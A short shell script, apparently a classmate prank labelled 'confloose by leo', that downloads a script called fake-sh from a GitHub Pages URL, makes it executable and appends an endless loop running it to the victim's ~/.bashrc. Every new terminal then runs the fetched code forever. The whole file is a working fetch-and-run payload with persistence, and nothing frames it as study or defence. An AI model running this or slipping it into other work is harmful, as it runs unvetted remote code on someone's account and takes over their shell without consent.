#!/bin/sh

tempdir=$(mktemp -d)

curl "https://d-002.github.io/epita/confloose/fake-sh/sh.sh" >> "$tempdir/sh"
chmod +x "$tempdir/sh"
echo "while true; do $tempdir/sh; done # confloose by leo [fake-sh]" >> "$HOME/.bashrc"
